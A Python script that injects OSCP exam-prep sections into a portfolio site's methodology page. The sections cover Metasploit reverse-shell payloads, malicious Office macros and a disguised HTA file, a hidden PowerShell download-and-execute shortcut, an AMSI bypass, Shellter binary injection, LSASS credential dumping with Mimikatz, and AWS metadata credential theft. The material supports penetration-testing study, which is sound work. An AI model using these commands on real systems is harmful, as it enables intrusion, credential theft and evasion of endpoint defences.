import re

html_path = r"d:\abdo_portfolio\main\templates\main\methodology.html"

with open(html_path, "r", encoding="utf-8") as f:
    content = f.read()

if 'meth-content-oscp_msf' in content:
    print("Already injected advanced OSCP content.")
    exit(0)

sidebar_injection = """
          <div class="meth-item" id="meth-ef-oscp_msf" onclick="openMethPhase('oscp_msf')" data-search="metasploit framework msfconsole msfvenom meterpreter">
            <span>├── 🦇</span> <span>Metasploit Tactics</span><span class="visited-badge"></span><button class="bookmark-btn" onclick="toggleBookmark(event, 'oscp_msf', '🦇 Metasploit Tactics')">★</button>
          </div>
          <div class="meth-item" id="meth-ef-oscp_client" onclick="openMethPhase('oscp_client')" data-search="client side attacks phishing macro hta lnk office">
            <span>├── 🎣</span> <span>Client-Side Attacks</span><span class="visited-badge"></span><button class="bookmark-btn" onclick="toggleBookmark(event, 'oscp_client', '🎣 Client-Side Attacks')">★</button>
          </div>
          <div class="meth-item" id="meth-ef-oscp_post" onclick="openMethPhase('oscp_post')" data-search="post exploitation evidence collection credential harvesting lsass">
            <span>├── 🕵️</span> <span>Post-Exploitation</span><span class="visited-badge"></span><button class="bookmark-btn" onclick="toggleBookmark(event, 'oscp_post', '🕵️ Post-Exploitation')">★</button>
          </div>
          <div class="meth-item" id="meth-ef-oscp_evade" onclick="openMethPhase('oscp_evade')" data-search="antivirus evasion amsi bypass shellter defender">
            <span>├── 🥷</span> <span>AV Evasion</span><span class="visited-badge"></span><button class="bookmark-btn" onclick="toggleBookmark(event, 'oscp_evade', '🥷 AV Evasion')">★</button>
          </div>
          <div class="meth-item" id="meth-ef-oscp_cloud" onclick="openMethPhase('oscp_cloud')" data-search="cloud aws enumeration s3 iam ec2 metadata">
            <span>├── ☁️</span> <span>Cloud/AWS Enum</span><span class="visited-badge"></span><button class="bookmark-btn" onclick="toggleBookmark(event, 'oscp_cloud', '☁️ Cloud/AWS Enum')">★</button>
          </div>"""

# Insert into the sidebar right before the Strategy item so Strategy remains at the bottom
idx_sidebar = content.find('<div class="meth-item" id="meth-ef-oscp_strat"')
if idx_sidebar != -1:
    content = content[:idx_sidebar] + sidebar_injection + "\n          " + content[idx_sidebar:]
else:
    print("Could not find Strategy sidebar item!")
    exit(1)


content_injection = """
      <!-- OSCP: Metasploit -->
      <div class="meth-content-view" id="meth-content-oscp_msf" style="display: none; --tool-color: #0284c7;">
        <div class="phase-module-header">
          <div class="icon-wrapper">🦇</div>
          <div class="header-text">
            <h2>Metasploit Framework (MSF)</h2>
            <p>Usage restrictions and core commands for exam scenarios.</p>
          </div>
        </div>
        
        <div class="cyber-card" style="margin-top:20px; border-left: 3px solid #0284c7;">
          <div class="card-header"><h3 style="color:#0284c7;">Exam Restrictions</h3></div>
          <p style="font-size:0.85rem; color:#ffb020;"><strong>WARNING:</strong> Metasploit auxiliary, exploit, and post modules can only be used against ONE single target machine. `msfvenom` and `multi/handler` are unrestricted.</p>
          <div class="cmd-grid" style="display: flex; flex-direction: column; gap: 15px; margin-top: 15px;">
            <div class="cmd-card">
              <strong style="color:#00d9ff;">MSFvenom Payloads</strong>
              <div class="code-snippet">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=4444 -f exe -o rev.exe
msfvenom -p linux/x86/shell_reverse_tcp LHOST=tun0 LPORT=4444 -f elf -o rev.elf</div>
            </div>
            <div class="cmd-card">
              <strong style="color:#00d9ff;">Meterpreter Basics</strong>
              <div class="code-snippet">getuid
sysinfo
hashdump
upload /root/linpeas.sh /tmp/linpeas.sh
download C:\\Users\\Admin\\proof.txt /root/proof.txt
shell</div>
            </div>
            <div class="cmd-card">
              <strong style="color:#00d9ff;">MSF Pivoting</strong>
              <p style="font-size:0.8rem; margin:5px 0;">Use MSF to route traffic into an internal network.</p>
              <div class="code-snippet">run autoroute -s 172.16.5.0/24
background
use auxiliary/server/socks_proxy
run -j</div>
            </div>
          </div>
        </div>
      </div>

      <!-- OSCP: Client-Side Attacks -->
      <div class="meth-content-view" id="meth-content-oscp_client" style="display: none; --tool-color: #ef4444;">
        <div class="phase-module-header">
          <div class="icon-wrapper">🎣</div>
          <div class="header-text">
            <h2>Client-Side Attacks</h2>
            <p>Weaponizing files to compromise users via social engineering vectors.</p>
          </div>
        </div>
        <div class="cyber-card" style="margin-top:20px;">
          <div class="cmd-grid" style="display: flex; flex-direction: column; gap: 15px;">
            <div class="cmd-card">
              <strong style="color:#ef4444;">1. Malicious Microsoft Macros (VBA)</strong>
              <p style="font-size:0.8rem; margin:5px 0;">Embed payloads inside Word/Excel documents that execute on opening.</p>
              <div class="code-snippet">msfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=4444 -f vba
# Copy output into Word Developer -> Visual Basic -> Document_Open()</div>
            </div>
            <div class="cmd-card">
              <strong style="color:#ef4444;">2. HTA (HTML Applications)</strong>
              <p style="font-size:0.8rem; margin:5px 0;">Internet Explorer processes HTA files outside the browser sandbox.</p>
              <div class="code-snippet">msfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=4444 -f hta-psh -o invoice.hta</div>
            </div>
            <div class="cmd-card">
              <strong style="color:#ef4444;">3. Windows Shortcut (.lnk) Files</strong>
              <p style="font-size:0.8rem; margin:5px 0;">Create a shortcut that executes PowerShell silently.</p>
              <div class="code-snippet">powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://[KALI]/rev.ps1')"</div>
            </div>
          </div>
        </div>
      </div>

      <!-- OSCP: Post-Exploitation -->
      <div class="meth-content-view" id="meth-content-oscp_post" style="display: none; --tool-color: #10b981;">
        <div class="phase-module-header">
          <div class="icon-wrapper">🕵️</div>
          <div class="header-text">
            <h2>Post-Exploitation Methodology</h2>
            <p>Extracting value and evidence after gaining access.</p>
          </div>
        </div>
        <div class="cyber-card" style="margin-top:20px;">
          <div class="cmd-grid" style="display: flex; flex-direction: column; gap: 15px;">
            <div class="cmd-card">
              <strong style="color:#10b981;">1. Situational Awareness</strong>
              <div class="code-snippet">whoami /all
ipconfig /all
netstat -ano
arp -a
route print</div>
            </div>
            <div class="cmd-card">
              <strong style="color:#10b981;">2. Evidence Collection</strong>
              <p style="font-size:0.8rem; margin:5px 0;">Crucial for the exam report. Must include IP and user in screenshot.</p>
              <div class="code-snippet">type C:\\Users\\[User]\\Desktop\\local.txt
cat /root/proof.txt</div>
            </div>
            <div class="cmd-card">
              <strong style="color:#10b981;">3. Credential Harvesting (Mimikatz/LSASS)</strong>
              <div class="code-snippet"># Dump LSASS memory
procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Extract offline with Mimikatz
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords</div>
            </div>
            <div class="cmd-card">
              <strong style="color:#10b981;">4. House Cleaning</strong>
              <p style="font-size:0.8rem; margin:5px 0;">Always remove uploaded exploits and binaries.</p>
              <div class="code-snippet">rm /tmp/linpeas.sh
del C:\\Temp\\winpeas.exe</div>
            </div>
          </div>
        </div>
      </div>

      <!-- OSCP: AV Evasion -->
      <div class="meth-content-view" id="meth-content-oscp_evade" style="display: none; --tool-color: #9333ea;">
        <div class="phase-module-header">
          <div class="icon-wrapper">🥷</div>
          <div class="header-text">
            <h2>Antivirus Evasion & AMSI Bypass</h2>
            <p>Techniques to slip past basic endpoint defenses.</p>
          </div>
        </div>
        <div class="cyber-card" style="margin-top:20px; border-left: 3px solid #9333ea;">
          <div class="cmd-grid" style="display: flex; flex-direction: column; gap: 15px;">
            <div class="cmd-card">
              <strong style="color:#9333ea;">1. AMSI Bypass Concepts</strong>
              <p style="font-size:0.8rem; margin:5px 0;">AMSI (Anti-Malware Scan Interface) inspects PowerShell memory. We must blind it.</p>
              <div class="code-snippet"># Obfuscated AmsiScanBuffer patch (Example)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)</div>
            </div>
            <div class="cmd-card">
              <strong style="color:#9333ea;">2. Shellter (Dynamic PE Injector)</strong>
              <p style="font-size:0.8rem; margin:5px 0;">Inject malicious shellcode into legitimate binaries (e.g., putty.exe) to bypass static signatures.</p>
              <div class="code-snippet">sudo apt install shellter
shellter
# Follow prompts: Select target executable -> Select Payload -> Inject</div>
            </div>
            <div class="cmd-card">
              <strong style="color:#9333ea;">3. In-Memory Execution</strong>
              <p style="font-size:0.8rem; margin:5px 0;">Avoid touching the disk with malicious binaries. Load scripts directly into RAM.</p>
              <div class="code-snippet">IEX (New-Object Net.WebClient).DownloadString('http://[KALI]/Invoke-Mimikatz.ps1')</div>
            </div>
          </div>
        </div>
      </div>

      <!-- OSCP: Cloud/AWS -->
      <div class="meth-content-view" id="meth-content-oscp_cloud" style="display: none; --tool-color: #f59e0b;">
        <div class="phase-module-header">
          <div class="icon-wrapper">☁️</div>
          <div class="header-text">
            <h2>Cloud / AWS Enumeration</h2>
            <p>Cloud exploitation is now a standard part of the OSCP+ syllabus.</p>
          </div>
        </div>
        <div class="cyber-card" style="margin-top:20px;">
          <div class="cmd-grid" style="display: flex; flex-direction: column; gap: 15px;">
            <div class="cmd-card">
              <strong style="color:#f59e0b;">1. EC2 Instance Metadata SSRF</strong>
              <p style="font-size:0.8rem; margin:5px 0;">If you find an SSRF on an AWS instance, steal the IAM role credentials.</p>
              <div class="code-snippet">curl http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE_NAME]</div>
            </div>
            <div class="cmd-card">
              <strong style="color:#f59e0b;">2. S3 Bucket Enumeration</strong>
              <p style="font-size:0.8rem; margin:5px 0;">Check for publicly readable or writable S3 buckets.</p>
              <div class="code-snippet">aws s3 ls s3://[bucket-name] --no-sign-request
aws s3 cp localfile.txt s3://[bucket-name]/ --no-sign-request</div>
            </div>
            <div class="cmd-card">
              <strong style="color:#f59e0b;">3. AWS CLI Configuration</strong>
              <p style="font-size:0.8rem; margin:5px 0;">If you steal Access Keys, configure your local CLI to use them.</p>
              <div class="code-snippet">aws configure
export AWS_ACCESS_KEY_ID="AKIA..."
export AWS_SECRET_ACCESS_KEY="..."
export AWS_SESSION_TOKEN="..."</div>
            </div>
          </div>
        </div>
      </div>
"""

# Inject into the main meth-viewer area.
# We will inject it right before <!-- OSCP: Strategy --> so strategy stays last.

idx_content = content.find('<!-- OSCP: Strategy -->')
if idx_content != -1:
    content = content[:idx_content] + content_injection + "\n      " + content[idx_content:]
    with open(html_path, "w", encoding="utf-8") as f:
        f.write(content)
    print("Injected Advanced OSCP modules successfully.")
else:
    print("Could not find Strategy content block!")
    exit(1)
